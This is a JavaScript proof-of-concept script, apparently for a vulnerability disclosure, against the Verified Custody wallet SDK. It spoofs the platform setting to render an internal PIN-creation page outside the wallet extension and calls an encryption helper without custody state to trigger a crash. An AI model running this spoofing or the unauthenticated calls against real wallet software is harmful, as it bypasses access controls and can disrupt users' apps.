/**
 * This Proof of Concept demonstrates how internal wallet UI flows
 * and cryptographic helpers from the Verified Custody SDK
 * can be executed outside the Verified Wallet Chrome Extension.
 *
 * The goal is NOT to steal funds here, but to prove a critical
 * trust-boundary and access-control failure in the SDK design.
 */

const React = require("react");
const ReactDOMServer = require("react-dom/server");

/**
 * Importing internal components that should never be part
 * of a public custody SDK API.
 *
 * These are security-critical wallet internals:
 * - CreatePinPage: part of wallet authentication flow
 * - VaultContextProvider: manages custody / vault state
 * - encryptString / decryptString: cryptographic helpers
 * - initPlatform: controls trusted execution environment
 */
const {
  CreatePinPage,
  VaultContextProvider,
  encryptString,
  decryptString,
  initPlatform,
} = require("@verified-network/verified-custody");

/**
 * 🔥 Platform spoofing
 *
 * The SDK trusts the platform configuration provided via initPlatform().
 * By manually injecting a fake "web" platform, we bypass the assumption
 * that this code is running inside the Verified Wallet extension.
 *
 * This demonstrates a broken trust boundary:
 * the SDK does not enforce where it is allowed to run.
 */
initPlatform({
  platform: {
    isReactNative: false,
    isWeb: true,
    isExtension: false, // Explicitly NOT the wallet extension
  },
});

/**
 * Minimal React app that mounts internal wallet components.
 *
 * This simulates a malicious or third-party application
 * reusing Verified Wallet UI flows outside the intended environment.
 */
function App() {
  return React.createElement(
    VaultContextProvider,
    null,
    React.createElement(CreatePinPage)
  );
}

/**
 * 1️⃣ UI Flow Exploit
 *
 * We attempt to server-render an internal wallet page
 * (CreatePinPage) outside the wallet extension.
 *
 * If this succeeds, it proves that internal authentication
 * and onboarding flows are publicly reusable.
 */
try {
  const rendered = ReactDOMServer.renderToString(
    React.createElement(App)
  );

  console.log("✅ Internal wallet UI rendered outside extension");
  console.log(rendered.slice(0, 200), "...");

} catch (e) {
  console.error("❌ UI render failed:", e.message);
}

/**
 * 2️⃣ Cryptographic Misuse / Denial-of-Service Vector
 *
 * Here we directly invoke a cryptographic helper without:
 * - user authentication
 * - custody initialization
 * - vault state
 *
 * This should NEVER be callable in isolation.
 */
console.log("\n🔐 Unauthorized cryptographic invocation test");

try {
  encryptString("attacker-controlled-input");

  // If this ever succeeds, it would indicate a critical failure.
  console.log("❌ Crypto helper executed without custody authorization");

} catch (e) {
  /**
   * The crash itself is important:
   *
   * - It proves the function is reachable
   * - It proves custody state is not enforced at the API boundary
   * - It introduces a denial-of-service risk
   *
   * Any consuming app can intentionally trigger this failure.
   */
  console.log("✅ Crypto helper reachable but crashes due to missing custody state");
  console.log("Impact: Unauthorized invocation + denial-of-service vector");
}
